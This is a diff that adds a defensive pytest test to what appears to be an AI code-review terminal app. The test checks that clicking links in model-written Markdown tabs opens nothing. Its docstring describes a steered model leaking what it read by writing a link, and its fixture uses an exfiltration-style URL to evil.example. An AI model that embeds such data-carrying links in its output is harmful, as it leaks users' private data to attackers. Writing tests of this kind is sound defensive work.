@@ -3626,3 +3626,33 @@ class TestWhatTheSecondRoundOfReviewFound:
             assert said[-1] == "This finding is posted as thread 148. Press p to open it."
             assert not isinstance(app.screen, CommentModal)
             assert azure_state.posted_threads(fake_ado.pr) == {"1a2b3c4d5e6f7a8b": 148}
+
+
+class TestWhatAnAuditFound:
+    """What an outside audit of the screen named, each reproduced before its fix."""
+
+    @pytest.mark.asyncio
+    async def test_a_link_in_the_comment_or_the_hand_off_opens_nothing(self, tmp_path: Path, monkeypatch) -> None:
+        """Read by an audit, and reproduced: the comment and the hand-off are drawn as Markdown, which makes a link of
+        an address in a finding's words, and one click opened it in the browser, the widget's own default. Those
+        words are a model's, and a steered one writes the address, what it read in its query. A finding's own tab
+        was made plain text for this; these two tabs open nothing."""
+        pytest.importorskip("textual")
+        from textual.widgets import Markdown
+        from textual.widgets.markdown import MarkdownBlock
+
+        from tui.app import AdkReviewTuiApp
+
+        _init_repo_with_remote(tmp_path)
+        app = AdkReviewTuiApp(config_path=_screen_config(tmp_path))
+        opened: list[str] = []
+        async with app.run_test(size=(140, 45)) as pilot:
+            await _wait_for_branches(app, pilot)
+            monkeypatch.setattr(app, "open_url", lambda url, **_how: opened.append(url))
+            for tab in ("#comment-md", "#handoff-md"):
+                shown = app.query_one(tab, Markdown)
+                await shown.update("1. The fix is at https://evil.example/?q=what-the-model-read")
+                await pilot.pause()
+                await shown.query(MarkdownBlock).first().action_link("https://evil.example/?q=what-the-model-read")
+                await pilot.pause()
+            assert opened == [], "a click on a link a model wrote opens nothing"
